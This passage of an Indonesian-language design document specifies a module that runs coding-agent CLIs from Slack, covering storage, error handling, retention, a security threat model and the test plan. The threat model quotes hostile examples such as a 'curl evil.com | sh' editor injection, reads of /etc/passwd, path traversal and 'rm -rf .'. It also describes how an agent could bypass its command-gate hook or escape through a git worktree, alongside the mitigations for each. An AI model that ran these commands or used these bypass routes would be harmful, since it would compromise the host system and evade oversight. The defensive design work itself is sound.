- ~~`agent_raw_events`~~ → `sessions/<id>/raw.jsonl`

Yang masih di DB (existing wick infrastructure, bukan agents-specific):
- `configs` table — untuk General/Slack/Workspace config (lewat wick tag system, lihat §8)
- Auth & permission — pakai sistem auth wick existing

**Kenapa drop semua tabel agents:**

| | DB (rows) | Filesystem (folder + json) |
|---|---|---|
| Schema migration | wajib (CREATE TABLE, ALTER) | tidak ada |
| List sessions | SQL ORDER BY | readdir + sort (cepat <500 session) |
| Lookup session detail | indexed query | path direct (`sessions/<id>/meta.json`) |
| Backup | dump SQL | `tar gz ~/.wick/agents/` |
| Delete session | DELETE rows + cascade | `rm -rf sessions/<id>/` |
| Concurrent write | row lock | atomic rename (`tmp → final`) |
| Tooling debug | sqlite3 query | `cat`, `jq`, file explorer |

Tradeoff yang diterima: filter complex lintas session = scan in-app (bukan SQL). Dianggap acceptable untuk skala wick agents (tool internal, bukan SaaS multi-tenant).

---

## 12. Error Handling

| Skenario | Handling |
|---|---|
| CLI binary tidak ditemukan | Tolak spawn, reply ke Slack: "CLI tidak ditemukan, pastikan claude/codex/gemini terinstall" |
| Subprocess crash (exit != 0) | Log error, set status idle, bebaskan slot, reply ke Slack: "Agent berhenti tidak terduga, kirim pesan untuk restart" |
| Slack rate limit | Exponential backoff, buffer response, kirim ulang |
| Response terlalu panjang (>4000 char) | Chunking: split per 3800 char, kirim sebagai reply berantai dalam thread |
| Disk penuh (workspace) | Block spawn, alert di dashboard dan Slack |
| Subprocess timeout (tidak ada output > 5 menit) | Kill subprocess, notify Slack |
| Hook (wick-gate) tidak respond | Fail-safe: **block** command, log error |

**Graceful shutdown** (wick di-stop):
- Subprocess yang sedang running diberi waktu 30 detik untuk selesai
- Setelah itu di-kill (status agent → idle, tulis ke `agents.json`)
- Message buffer yang belum terkirim di-persist ke `sessions/<id>/meta.json` (field `pending_input []string`) — saat wick start lagi, drain buffer ke subprocess yang baru spawn

---

## 13. Retention & Cleanup

| Data | Retention | Cleanup |
|---|---|---|
| `conversation.jsonl` | 30 hari (configurable) | Job harian: gzip rotate file >threshold (`conversation-2026-04.jsonl.gz`), hapus archive >30 hari |
| `commands.jsonl` | 7 hari | Sama: gzip rotate + hapus archive |
| `raw.jsonl` | 7 hari (lebih agresif, file paling gendut) | Sama |
| Session folders (`sessions/<id>/`) | Selamanya (sampai user hapus) | Manual dari UI atau `rm -rf` |
| Project folders (`projects/<nama>/`) | Selamanya | Manual dari UI |
| CLI session files (`~/.claude/projects/`) | Dikelola CLI sendiri | Wick tidak touch (kecuali user trigger Reset di UI) |

**Cap content per turn**: assistant message di-cap 32 KB sebelum tulis ke `conversation.jsonl`. Sisanya truncated + note `(truncated, lihat raw.jsonl)`. Cegah single turn raksasa bikin file melar.

---

## 14. Storage

Aturan: **semua state agents di filesystem** (`~/.wick/agents/`). DB cuma untuk config dan auth (existing wick).

| Data | Storage |
|---|---|
| General / Slack / Workspace config | `configs` table di DB wick (via wick tag system, §8) |
| Auth & permission | DB wick (existing system) |
| Project metadata | `~/.wick/agents/projects/<nama>/meta.json` |
| Project workspace (cloned repo) | `~/.wick/agents/projects/<nama>/workspace/` |
| Session metadata (status, last_active, project, origin, channel_id) | `~/.wick/agents/sessions/<id>/meta.json` |
| Per-session agent registry (name, backend, cli_session_id, status) | `~/.wick/agents/sessions/<id>/agents.json` |
| Session preset snapshot | `~/.wick/agents/sessions/<id>/agent.md` |
| Conversation history | `~/.wick/agents/sessions/<id>/conversation.jsonl` |
| Command gate log | `~/.wick/agents/sessions/<id>/commands.jsonl` |
| Raw stream events (optional) | `~/.wick/agents/sessions/<id>/raw.jsonl` |
| Session worktree | `~/.wick/agents/sessions/<id>/workspace/` |
| Preset definitions | `~/.wick/agents/presets/<nama>/agent.md` |
| CLI internal state (untuk resume) | dikelola CLI (`~/.claude/projects/`, `~/.codex/sessions/`, `~/.gemini/tmp/`) |

**Backup**: `tar czf wick-agents-backup.tar.gz ~/.wick/agents/`. Restore: extract balik. No SQL dump needed untuk data agents.

---

## 15. Security Considerations

Modul agents spawn subprocess yang punya akses shell — high-risk surface. Threat model + mitigasi:

### 15.1 Command injection via whitelist glob

Whitelist `git *` cocok untuk `git clone ...`, tapi juga cocok untuk `git config --global core.editor 'curl evil.com | sh'`. Glob = pattern, bukan parser.

| Mitigasi | Cara |
|---|---|
| Whitelist konservatif by default | Bootstrap seed cuma `git status`, `git diff`, `ls *`, `cat *`. User tambah eksplisit |
| Parse args, bukan match string | wick-gate decompose command jadi `[git, clone, <url>]` array, validasi tiap arg |
| Block shell metacharacter di args | `;`, `|`, `>`, `<`, `` ` ``, `$(`, `&&` di arg → block |
| Scope path | `cat *` cuma allowed di bawah cwd worktree, tidak `cat /etc/passwd` |

### 15.2 Hook bypass

CLI hook = subprocess wick-gate. Kalau user/agent bisa modify `~/.claude/settings.json` di tengah session, hook bisa di-disable.

| Mitigasi | Cara |
|---|---|
| Hook config di temp dir | Wick spawn claude dengan `--config <temp-settings.json>`, bukan modify `~/.claude/settings.json` user |
| Read-only settings | File di temp dir di-set 0444 (read-only) |
| Argv whitelist | wick-gate verify subprocess argv mengandung flag `--config` ke temp file yang wick punya — kalau berubah, abort |

Catatan: full bypass tidak bisa dicegah 100% kalau agent punya akses tulis ke filesystem. Ini fundamental — jangan jalankan agent dengan privilege berlebih.

### 15.3 Secret leak via raw.jsonl

`raw.jsonl` menyimpan semua event mentah, termasuk argument tool call. Kalau agent eksekusi `curl -H "Authorization: Bearer abc" ...`, token muncul di file.

| Mitigasi | Cara |
|---|---|
| Pattern redaction | Sebelum tulis ke raw.jsonl, regex replace `Bearer\s+\S+`, `Authorization:\s*\S+`, `password=\S+` |
| Opt-in, bukan default | Raw events default OFF, user enable explicit per session |
| Retention agresif | 7 hari (sudah di §13) |
| Akses kontrol | UI raw view butuh role admin |

### 15.4 Privilege escalation via worktree

Agent bisa `git worktree add /tmp/escape -b ...` kalau path bukan di whitelist. Worktree di luar `~/.wick/agents/` = bypass scope.

| Mitigasi | Cara |
|---|---|
| Block `git worktree` di whitelist default | Tidak ada di seed |
| Wick yang manage worktree, bukan agent | Worktree create/remove cuma via wick code, bukan via agent shell |

### 15.5 Slack token leak

`SlackConfig.BotToken` masuk DB. Sudah pakai `secret` tag (auto-mask di UI), tapi kalau agent baca file via tool (`cat ~/.wick/...`), bisa leak.

| Mitigasi | Cara |
|---|---|
| Block path `~/.wick/` di scope whitelist | Whitelist scope cuma worktree dir |
| File permission | DB file 0600, hanya wick process yang bisa read |
| Encrypted at rest | (Optional, future) — pakai wick encrypted-fields untuk plaintext token |

### 15.6 SSE auth bypass

SSE endpoint `/tools/agents/stream` broadcast semua event termasuk command yang sensitif. Kalau endpoint tidak auth-gated, leak.

| Mitigasi | Cara |
|---|---|
| Tool visibility = `VisibilityPrivate` | Login + role check via wick auth (existing) |
| Per-session SSE filter | Hanya broadcast event session yang user punya akses |

### 15.7 Path traversal di session_id / project name

User Slack kirim thread_ts standar (no traversal risk). Tapi UI / API bisa kirim `../../etc/passwd` sebagai session_id atau project name.

| Mitigasi | Cara |
|---|---|
| Validate name | Regex `^[a-zA-Z0-9_-]+$` untuk project, `^[0-9._-]+$` untuk session_id |
| Reject `..`, `/`, leading `.` | Hard fail di handler |

---

## 16. Testing Strategy

### 16.1 Unit test (per file)

Cover function level — fast (<1s per file).

| Fokus | Pakai |
|---|---|
| `storage.go` (atomic write, append jsonl, scan) | `t.TempDir()`, golden file compare |
| `events.go` (parser claude/codex/gemini) | Fixture jsonl recording dari run real, assert output AgentEvent |
| `gate.go` (whitelist match) | Table-driven test patterns |
| `metacmd.go` (parser meta-command) | Table-driven test inputs |
| `state.go` (state machine) | Drive transitions manually, assert state |

### 16.2 Integration test (per phase exit)

Cover flow lintas file. Spawn real subprocess kalau perlu (skip kalau CLI tidak ada di PATH).

| Phase | Test scenario |
|---|---|
| Phase 1 | Create project + 2 session, restart wick, registry scan == before-restart state |
| Phase 2 | Send message → claude spawn → response di conversation.jsonl. Idle TTL kill, send lagi → resume sukses |
| Phase 3 | Whitelist `ls *` only, claude exec `rm -rf .` → block, commands.jsonl entry |
| Phase 4 | UI: POST /sessions/{id}/send → conversation.jsonl + SSE event |
| Phase 5 | (manual) Slack thread message → reaction lifecycle + final reply |

### 16.3 Replay test pakai `raw.jsonl`

Ambil `raw.jsonl` dari run real (gunakan untuk debug). Feed ke parser → assert AgentEvent stream sama.

```go
// Example: fixture-based replay
func TestClaudeParserReplay(t *testing.T) {
    raw := readFixture("testdata/raw-2026-05-08.jsonl")
    events := parseAll(t, raw)
    assertSequence(t, events, expectedEvents)
}
```

Kelebihan: test deterministik tanpa spawn subprocess. Bug parser ketauan dari real data.

### 16.4 Smoke test manual

Belum ada e2e otomatis untuk Slack. Checklist manual saat phase 5:

- [ ] Bot reply di thread baru
- [ ] Reaction ⏳ saat queued (force pool penuh)
- [ ] Reaction ⚙️ → ✅ saat selesai
- [ ] Final message muncul, chunked kalau >4000 char
- [ ] Meta-command `dashboard` reply URL benar
- [ ] Meta-command `reset` clear conversation, agent mulai fresh
- [ ] Access control: user di-luar list = pesan diabaikan
- [ ] Restart wick mid-session, kirim pesan baru = resume bekerja